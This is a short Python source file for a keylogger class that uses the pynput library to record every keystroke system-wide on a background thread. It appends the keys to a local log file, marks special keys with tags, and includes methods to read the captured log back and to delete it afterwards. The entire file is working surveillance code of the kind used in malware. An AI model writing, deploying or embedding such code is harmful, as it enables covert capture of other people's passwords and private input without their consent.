from pynput.keyboard import Listener
import threading
import re
import os

class KL:
	button = []
	count = 0
	path = 'log_output.txt'

	def s_listen(self):
		global listener
		with Listener(on_press=self.key_pressed) as listener:
			listener.join()

	def s_logger(self):
		self.t = threading.Thread(target=self.s_listen)
		self.t.start()

	def key_pressed(self, key):
		self.button.append(key)
		self.count += 1
		if self.count >= 1:
			self.count = 0
			with open(self.path, 'a') as file:
				for i in self.button:
					i = re.sub("'", "", str(i))
					if i == "Key.enter":
						file.write("\n")
					elif i in ("Key.shift",
								"Key.shift_r",
								"Key.ctrl",
								"Key.escape"):
						pass
					elif i == "Key.backspace":
						file.write(" [bs] ")
					elif i == "Key.space":
						file.write(" ")
					elif i == "Key.tab":
						file.write(" [T] ")
					elif i == "Key.caps_lock":
						file.write(" [cl] ")
					elif i == "Key.left":
						file.write(" [L] ")
					elif i == "Key.right":
						file.write(" [R] ")
					elif i == "Key.up":
						file.write(" [U] ")
					elif i == "Key.down":
						file.write(" [D] ")
					else:
						file.write(i)

		self.button = []

	def r_log(self):
		with open('log_output.txt', 'r') as file:
			data = file.read()
			return data

	def st_listen(self):
		listener.stop()
		os.remove(self.path)
